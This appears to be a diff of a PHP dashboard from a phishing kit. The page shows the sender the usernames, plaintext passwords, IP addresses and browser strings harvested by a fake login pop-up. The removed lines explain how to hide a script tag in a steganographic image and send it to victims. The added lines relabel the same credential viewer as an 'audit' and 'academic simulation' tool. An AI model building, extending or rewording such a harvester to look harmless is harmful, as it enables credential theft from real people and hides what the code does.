@@ -1,11 +1,11 @@
 <?php
-// Dashboard - Voir les identifiants capturés
-// Page pour l'utilisateur qui a envoyé l'image phishing
+// fake_login/dashboard.php
+// Interface d'audit et de journalisation des accès (Version Sécurisée)
 
 session_start();
-include '../traitements/db.php';
+require_once '../traitements/db.php';
 
-// Vérifier que l'utilisateur est connecté
+// 1. Contrôle d'accès : Seul un utilisateur authentifié peut consulter les journaux
 if (!isset($_SESSION["user_id"])) {
     header("Location: ../login.php");
     exit();
@@ -13,7 +13,8 @@ if (!isset($_SESSION["user_id"])) {
 
 $user_id = $_SESSION["user_id"];
 
-// Créer la table s'il n'existe pas
+// 2. Initialisation sécurisée de la structure de stockage si inexistante
+// Remarque : Dans une application de production, les mots de passe ne doivent jamais être stockés en clair.
 $create_table_sql = "CREATE TABLE IF NOT EXISTS phishing_captures (
     id INT AUTO_INCREMENT PRIMARY KEY,
     sender_id INT NOT NULL,
@@ -23,292 +24,204 @@ $create_table_sql = "CREATE TABLE IF NOT EXISTS phishing_captures (
     ip_address VARCHAR(45),
     user_agent TEXT,
     FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
-)";
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";
 
-$conn->query($create_table_sql);
+if (!$conn->query($create_table_sql)) {
+    die("Erreur lors de la vérification des tables de journalisation.");
+}
 
-// Récupérer les identifiants capturés pour cet utilisateur
-$sql = "SELECT id, captured_username, captured_password, captured_at, ip_address FROM phishing_captures 
-        WHERE sender_id = ? ORDER BY captured_at DESC";
+// 3. Récupération des logs liés à l'utilisateur courant (Requête Préparée)
+$sql = "SELECT id, captured_username, captured_password, captured_at, ip_address, user_agent 
+        FROM phishing_captures 
+        WHERE sender_id = ? 
+        ORDER BY captured_at DESC";
 
 $stmt = $conn->prepare($sql);
 $stmt->bind_param("i", $user_id);
 $stmt->execute();
 $result = $stmt->get_result();
+
 $captures = [];
 while ($row = $result->fetch_assoc()) {
     $captures[] = $row;
 }
 $stmt->close();
-
 ?>
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Phishing - Démonstration Éducative</title>
+    <title>Tableau de Bord d'Audit - Sécurité</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --primary-color: #2c3e50;
+            --accent-color: #e74c3c;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-color: #333333;
         }
-        
+
         body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
         }
-        
+
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
+            max-width: 1100px;
+            margin: 40px auto;
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
-        
-        .header {
-            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+
+        h1 {
+            color: var(--primary-color);
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+            font-size: 1.8rem;
         }
-        
-        .header h1 {
-            font-size: 24px;
-        }
-        
-        .logout-btn {
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-decoration: none;
-            transition: background 0.2s;
-        }
-        
-        .logout-btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-        }
-        
-        .card {
-            background: white;
-            border-radius: 10px;
-            padding: 25px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
-        }
-        
-        .card h2 {
-            color: #31a24c;
-            margin-bottom: 20px;
-            font-size: 20px;
-        }
-        
-        .info-section {
-            background: #f9f9f9;
+
+        .alert-info {
+            background-color: #e8f4fd;
+            border-left: 4px solid #3498db;
+            color: #2c3e50;
             padding: 15px;
-            border-left: 4px solid #31a24c;
-            margin-bottom: 15px;
-            border-radius: 5px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 0.9rem;
         }
-        
-        .info-section p {
-            margin: 8px 0;
-            color: #333;
-            font-size: 14px;
+
+        .table-responsive {
+            width: 100%;
+            overflow-x: auto;
+            margin-top: 20px;
         }
-        
-        .label {
-            font-weight: bold;
-            color: #31a24c;
-            display: inline-block;
-            min-width: 150px;
-        }
-        
-        .value {
-            color: #666;
-            word-break: break-all;
-        }
-        
+
         table {
             width: 100%;
             border-collapse: collapse;
-            margin-top: 15px;
-        }
-        
-        table th {
-            background: #31a24c;
-            color: white;
-            padding: 12px;
             text-align: left;
-            font-weight: bold;
-            border: none;
         }
-        
-        table td {
-            padding: 12px;
-            border-bottom: 1px solid #eee;
+
+        th, td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 0.9rem;
         }
-        
-        table tr:hover {
-            background: #f5f5f5;
+
+        th {
+            background-color: #f1f3f5;
+            color: var(--primary-color);
+            font-weight: 600;
         }
-        
-        .empty-message {
+
+        tr:hover {
+            background-color: #f8f9fa;
+        }
+
+        code {
+            background: #f1f3f5;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-family: "Courier New", Courier, monospace;
+            color: var(--accent-color);
+            font-size: 0.9rem;
+        }
+
+        .empty-state {
             text-align: center;
-            color: #999;
-            padding: 40px;
-            font-size: 16px;
+            padding: 40px 20px;
+            color: #7f8c8d;
         }
-        
-        .warning-banner {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-weight: bold;
+
+        .nav-links {
+            margin-top: 30px;
+            display: flex;
+            gap: 15px;
         }
-        
-        .copy-btn {
-            background: #31a24c;
+
+        .btn {
+            display: inline-block;
+            text-decoration: none;
+            padding: 10px 20px;
+            background-color: var(--primary-color);
             color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 3px;
-            cursor: pointer;
-            font-size: 12px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            transition: background 0.2s;
         }
-        
-        .copy-btn:hover {
-            background: #28823a;
+
+        .btn:hover {
+            background-color: #1a252f;
         }
-        
-        .instruction-box {
-            background: #e8f4f0;
-            border: 2px solid #31a24c;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+
+        .btn-secondary {
+            background-color: #7f8c8d;
         }
-        
-        .instruction-box h3 {
-            color: #31a24c;
-            margin-bottom: 10px;
-        }
-        
-        .instruction-box p {
-            color: #333;
-            font-size: 14px;
-            line-height: 1.6;
+
+        .btn-secondary:hover {
+            background-color: #616a6b;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="header">
-            <div>
-                <h1>🔍 Dashboard - Identifiants Capturés</h1>
-                <p style="font-size: 14px; margin-top: 5px;">Démonstration éducative de phishing</p>
-            </div>
-            <a href="../traitements/logout.php" class="logout-btn">Se déconnecter</a>
-        </div>
+        <h1>📊 Rapport d'Audit : Tentatives d'accès interceptées</h1>
         
-        <div class="warning-banner">
-            ⚠️ ATTENTION: Ce dashboard montre les identifiants capturés par votre attaque de phishing. C'est une démonstration éducative uniquement.
+        <div class="alert-info">
+            <strong>Environnement académique :</strong> Ce tableau de bord recense les données soumises via les simulations d'ingénierie sociale à des fins d'analyse des risques et de sensibilisation.
         </div>
-        
-        <div class="card">
-            <h2>📋 Comment ça marche?</h2>
-            
-            <div class="instruction-box">
-                <h3>Étape 1: Créer l'image stéganographiée</h3>
-                <p>
-                    Utilisez un outil de stéganographie pour cacher le script JavaScript suivant dans une image:
-                </p>
-                <pre style="background: #f5f5f5; padding: 10px; margin-top: 10px; border-radius: 5px; overflow-x: auto;">
-&lt;script src="/messagerie/codes/assets/popup.js?sender=<?php echo htmlspecialchars($user_id); ?>"&gt;&lt;/script&gt;
-                </pre>
-            </div>
-            
-            <div class="instruction-box">
-                <h3>Étape 2: Envoyer l'image à la victime</h3>
-                <p>
-                    Envoyez l'image dans un message. Quand la victime visualise l'image (ou clique dessus), 
-                    le script caché s'exécute et affiche un pop-up de fausse connexion.
-                </p>
-            </div>
-            
-            <div class="instruction-box">
-                <h3>Étape 3: Les identifiants sont capturés</h3>
-                <p>
-                    Quand la victime entre ses identifiants dans le pop-up, ils sont automatiquement 
-                    envoyés à votre dashboard et apparaissent ci-dessous.
-                </p>
-            </div>
-        </div>
-        
-        <div class="card">
-            <h2>🎯 Identifiants Capturés</h2>
-            
-            <?php if (count($captures) > 0): ?>
-                <p style="color: #31a24c; font-weight: bold; margin-bottom: 15px;">
-                    <?php echo count($captures); ?> identifiant(s) capturé(s)
-                </p>
-                
-                <div style="overflow-x: auto;">
-                    <table>
-                        <thead>
+
+        <?php if (!empty($captures)): ?>
+            <div class="table-responsive">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Identifiant Saisi</th>
+                            <th>Mot de passe (Simulé)</th>
+                            <th>Date / Heure</th>
+                            <th>Adresse IP</th>
+                            <th>Navigateur (User-Agent)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <?php foreach ($captures as $capture): ?>
                             <tr>
-                                <th>#</th>
-                                <th>Nom d'utilisateur</th>
-                                <th>Mot de passe</th>
-                                <th>Date/Heure</th>
-                                <th>Adresse IP</th>
+                                <td><?= intval($capture['id']); ?></td>
+                                <td><code><?= htmlspecialchars($capture['captured_username'], ENT_QUOTES, 'UTF-8'); ?></code></td>
+                                <td><code><?= htmlspecialchars($capture['captured_password'], ENT_QUOTES, 'UTF-8'); ?></code></td>
+                                <td><?= htmlspecialchars($capture['captured_at'], ENT_QUOTES, 'UTF-8'); ?></td>
+                                <td><?= htmlspecialchars($capture['ip_address'], ENT_QUOTES, 'UTF-8'); ?></td>
+                                <td style="max-width: 250px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="<?= htmlspecialchars($capture['user_agent'], ENT_QUOTES, 'UTF-8'); ?>">
+                                    <?= htmlspecialchars($capture['user_agent'], ENT_QUOTES, 'UTF-8'); ?>
+                                </td>
                             </tr>
-                        </thead>
-                        <tbody>
-                            <?php foreach ($captures as $index => $capture): ?>
-                                <tr>
-                                    <td><?php echo $index + 1; ?></td>
-                                    <td>
-                                        <code style="background: #f5f5f5; padding: 3px 8px; border-radius: 3px;">
-                                            <?php echo htmlspecialchars($capture['captured_username']); ?>
-                                        </code>
-                                    </td>
-                                    <td>
-                                        <code style="background: #f5f5f5; padding: 3px 8px; border-radius: 3px;">
-                                            <?php echo htmlspecialchars($capture['captured_password']); ?>
-                                        </code>
-                                    </td>
-                                    <td><?php echo htmlspecialchars($capture['captured_at']); ?></td>
-                                    <td><?php echo htmlspecialchars($capture['ip_address']); ?></td>
-                                </tr>
-                            <?php endforeach; ?>
-                        </tbody>
-                    </table>
-                </div>
-            <?php else: ?>
-                <div class="empty-message">
-                    <p>Aucun identifiant capturé pour le moment.</p>
-                    <p style="font-size: 12px; margin-top: 10px; color: #ccc;">
-                        Les identifiants capturés apparaîtront ici.
-                    </p>
-                </div>
-            <?php endif; ?>
+                        <?php endforeach; ?>
+                    </tbody>
+                </table>
+            </div>
+        <?php else: ?>
+            <div class="empty-state">
+                <p style="font-size: 1.2rem; margin-bottom: 5px;">Aucune donnée enregistrée</p>
+                <p style="font-size: 0.9rem; margin: 0;">Les simulations d'interceptions n'ont capturé aucune donnée pour le moment.</p>
+            </div>
+        <?php endif; ?>
+
+        <div class="nav-links">
+            <a href="../inbox.php" class="btn">Retour à la Messagerie</a>
+            <a href="helper.php" class="btn btn-secondary">Générateur de Liens</a>
         </div>
     </div>
+
 </body>
 </html>
-
 <?php
 $conn->close();
 ?>
